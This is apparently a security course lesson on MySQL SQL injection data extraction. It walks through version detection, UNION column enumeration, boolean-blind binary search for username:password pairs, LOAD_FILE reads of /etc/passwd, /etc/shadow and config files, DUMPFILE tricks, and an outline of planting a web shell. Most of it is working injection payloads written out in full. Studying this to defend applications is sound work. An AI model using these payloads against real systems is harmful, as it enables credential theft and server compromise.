# 36 - SQL Injection: Data Extraction Techniques

## Version Detection — Why It Matters

```
http://www.site.com/news.php?id=5 and substring(version(),1,1)=4
```

Tests if the first character of the MySQL version is `4` (MySQL 4.x). This is the attacker's **first reconnaissance step** because different MySQL versions have different capabilities:

| MySQL Version | Available Features |
|--------------|-------------------|
| MySQL < 4.0 | No `UNION`, no subqueries — extraction is very limited |
| MySQL 4.0+ | `UNION` supported — can combine query results |
| MySQL 5.0+ | `information_schema` — metadata database listing all tables, columns, databases |

Without `UNION`, the attacker is limited to blind injection only. With `information_schema`, the attacker can enumerate the entire database structure without guessing table/column names.

**How version detection works in the query:**

```sql
-- Original query:
SELECT title, body FROM news WHERE id = 5

-- After injection:
SELECT title, body FROM news WHERE id = 5 and substring(version(),1,1)=4
```

- `version()` — MySQL function returning the full version string (e.g., `'5.7.34'`)
- `substring(version(),1,1)` — extracts the first character (`'5'`)
- `= 4` — tests if it's MySQL 4.x
- If true: page shows the article (condition passes). If false: page is blank (condition fails)

## UNION-Based Data Extraction

UNION is the most efficient injection technique — it returns full query results directly in the page output.

### Step 1: Finding the Column Count

The attacker must first determine how many columns the original query returns, since `UNION` requires both SELECTs to have the **exact same number of columns**.

```
id=5 union all select 1,2,3 from admin
```

If this errors, the original query doesn't have 3 columns. The attacker tries:

```
id=5 union all select 1           -- 1 column?  → error
id=5 union all select 1,2         -- 2 columns? → error
id=5 union all select 1,2,3       -- 3 columns? → success! Page renders
```

An alternative method uses `ORDER BY`:

```
id=5 order by 1    -- success (at least 1 column)
id=5 order by 2    -- success (at least 2 columns)
id=5 order by 3    -- success (at least 3 columns)
id=5 order by 4    -- error!  (only 3 columns exist)
```

### Step 2: Identifying Which Columns Are Displayed

```
id=5 union all select 1,2,3 from admin
```

The page might show `1` in the title area and `3` in the body area, but `2` is never displayed (maybe it's used internally). The attacker now knows to put target data in **column 1 or 3** to see it on the page.

### Step 3: Reading Target Data

```
id=5 union all select 1,2,passwd from admin
```

Replaces the third column with the `passwd` field from the `admin` table. The password hash appears in the page body where column 3 is rendered.

**The original query + injected UNION:**

```sql
SELECT title, description, body FROM news WHERE id = 5
UNION ALL
SELECT 1, 2, passwd FROM admin
```

Result set:

```
| title          | description | body                             |
|----------------|-------------|----------------------------------|
| "News Title"   | "Desc..."   | "Article body..."                | ← original row
| 1              | 2           | "5f4dcc3b5aa765d61d8327deb882cf99"| ← injected row (password hash)
```

`UNION ALL` (vs `UNION`) keeps duplicate rows and skips the deduplication sort — faster and avoids accidentally losing data.

## Boolean Blind with Binary Search

When UNION output isn't visible (e.g., the page only shows "article found" or "not found"), the attacker extracts data character by character using boolean conditions and **binary search** on ASCII values.

### The Target Data

The attacker wants to extract: `concat(username, 0x3a, passwd)` — the username and password joined with `:`.

For example, if the data is `admin:s3cret`, the combined string is `admin:s3cret` (ASCII values: `a`=97, `d`=100, `m`=109, `i`=105, `n`=110, `:`=58, `s`=115, ...).

### Binary Search — Step by Step

```sql
-- Is first char ASCII > 64? (true → char is above '@')
id=5 and ascii(substring((select concat(username,0x3a,passwd)
  from users limit 0,1),1,1))>64   /*ret true*/

-- Is it > 96? (true → char is above '`', likely lowercase letter)
id=5 and ascii(substring((select concat(username,0x3a,passwd)
  from users limit 0,1),1,1))>96   /*ret true*/

-- Is it > 100? (false → char is between 97-100: 'a','b','c','d')
id=5 and ascii(substring((select concat(username,0x3a,passwd)
  from users limit 0,1),1,1))>100  /*ret false*/

-- Is it > 97? (false → char is 97 = 'a' or 98 = 'b')
id=5 and ascii(substring((select concat(username,0x3a,passwd)
  from users limit 0,1),1,1))>97   /*ret false*/

-- Not > 97, but > 96. Therefore: ASCII 97 = 'a'
-- First character is 'a' ✓
```

Then move to the second character (position 2):

```sql
id=5 and ascii(substring((select concat(username,0x3a,passwd)
  from users limit 0,1),2,1))>64   /*ret true*/
...
-- Eventually determines: ASCII 100 = 'd'
-- Second character is 'd' ✓
```

After extracting all characters: `a` + `d` + `m` + `i` + `n` + `:` + `s` + `3` + `c` + `r` + `e` + `t` = `admin:s3cret`

### Breaking Down the Query

```sql
ascii(substring((select concat(username,0x3a,passwd) from users limit 0,1),1,1))>64
│     │          │       │              │    │                    │    │ │
│     │          │       │              │    │                    │    │ └── > 64: boolean test
│     │          │       │              │    │                    │    └── 1: extract 1 char
│     │          │       │              │    │                    └── 1: starting at position 1
│     │          │       │              │    └── limit 0,1: first row only
│     │          │       │              └── 0x3a: ':' character as separator
│     │          │       └── concat(): join username + ':' + password
│     │          └── subquery: the data source
│     └── substring(): extract one character
└── ascii(): convert char to number for comparison
```

| Component | Purpose |
|-----------|---------|
| `select concat(username,0x3a,passwd) from users` | Combine username and password with `:` separator (`0x3a` = `':'`) |
| `limit 0,1` | Get the first row only (change to `limit 1,1` for second row, `limit 2,1` for third, etc.) |
| `substring(...,1,1)` | Extract character at position 1 (change first number for each position) |
| `ascii(...)` | Convert character to its ASCII number for numeric comparison |
| `> 64` | Boolean test — true or false changes the page |

### Binary Search Efficiency

ASCII printable characters range from 32–126. Binary search narrows this in ~7 steps per character:

```
Full range:  32 ─────────────────────── 126
                        79
                  ┌──────┴──────┐
Step 1 (>79):   32-79         80-126

If true (>79):        79
                ┌──────┴──────┐
Step 2 (>103): 80-103       104-126

If false (≤103):     103
                ┌─────┴─────┐
Step 3 (>91):  80-91       92-103

... continue halving until exact value found
~7 steps → exact character
```

For a 32-character password: `32 × 7 = 224` requests. Slow for a human, trivial for an automated tool like sqlmap.

### Moving to the Next Row

After extracting the first user's credentials, change `limit`:

```sql
limit 0,1  → first row  (admin:s3cret)
limit 1,1  → second row (user2:password)
limit 2,1  → third row  (user3:qwerty)
```

## Reading Server Files

### LOAD_FILE — Read Files from Disk

```sql
… union select 1,1,LOAD_FILE('/etc/passwd'),1,1;
```

`LOAD_FILE()` is a MySQL function that reads a file from the **server's filesystem** and returns its content as a string. The attacker uses UNION to place the file content into a visible column on the page.

**What the attacker sees on the page:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

From `/etc/passwd`, the attacker learns: usernames, home directories, shells, and which services are installed. This informs further attacks.

**Common target files:**

| File | What it reveals |
|------|----------------|
| `/etc/passwd` | System users, home dirs, installed services |
| `/etc/shadow` | Password hashes (usually requires root) |
| `/var/www/html/config.php` | Database credentials, API keys |
| `/var/www/html/.htaccess` | Apache configuration, access rules |
| `/etc/my.cnf` | MySQL configuration, data directory |
| `/proc/self/environ` | Environment variables (may contain secrets) |

**Requirements:**
- MySQL `FILE` privilege
- MySQL process must have OS-level read permission on the file
- File size must be under `max_allowed_packet`

### Advanced File Reading via Temp Table

When direct LOAD_FILE output is problematic (binary files, encoding issues, special characters breaking the page):

```sql
CREATE TABLE potatoes(line BLOB);

UNION SELECT 1,1,HEX(LOAD_FILE('/etc/passwd')),1,1
INTO DUMPFILE '/tmp/potatoes';

LOAD DATA INFILE '/tmp/potatoes' INTO TABLE potatoes;
```

**Step-by-step:**

1. **`CREATE TABLE potatoes(line BLOB)`** — create a temp table with a `BLOB` column. BLOB (Binary Large Object) handles any data without encoding issues.

2. **`HEX(LOAD_FILE('/etc/passwd'))`** — read the file and convert every byte to its hex representation. For example, `root:x:0` becomes `726F6F743A783A30`. This avoids null bytes, special characters, or encoding issues that might corrupt the output.

3. **`INTO DUMPFILE '/tmp/potatoes'`** — write the hex string to a temp file on disk. `DUMPFILE` writes raw bytes without adding tabs or newlines (unlike `OUTFILE`).

4. **`LOAD DATA INFILE '/tmp/potatoes' INTO TABLE potatoes`** — import the temp file into the database table. The attacker can now query the table to retrieve the data.

This roundabout method handles binary files (executables, images, encrypted configs) and avoids display corruption. The attacker can then `SELECT HEX(line) FROM potatoes` or use `UNHEX()` to decode.

### OUTFILE vs DUMPFILE

| | `INTO OUTFILE` | `INTO DUMPFILE` |
|---|---------------|-----------------|
| **Format** | Adds column separators (tabs) and row terminators (newlines) | Writes raw bytes, no formatting |
| **Multiple rows** | Writes all rows | Writes only one row |
| **Use case** | Text data, CSV export | Binary files, exact byte output |
| **Web shell writing** | Works (extra whitespace is harmless to PHP) | Cleaner output for binary payloads |

## Summary: SQL Injection Data Access

```
SQL Injection
  ├── Reconnaissance
  │   └── Version detection (substring(version(),1,1))
  │
  ├── Read data from database
  │   ├── UNION SELECT (direct output — fastest)
  │   ├── Boolean blind (binary search, ~7 requests per char)
  │   └── Time-based blind (BENCHMARK/SLEEP — slowest, last resort)
  │
  ├── Read files from server
  │   ├── LOAD_FILE('/etc/passwd') — direct read
  │   └── HEX(LOAD_FILE()) + temp table — for binary/problematic files
  │
  ├── Write files to server
  │   ├── INTO OUTFILE (text, with formatting)
  │   └── INTO DUMPFILE (binary, raw bytes)
  │
  └── Execute commands (via web shell)
      └── Write PHP → access via HTTP → system()
```
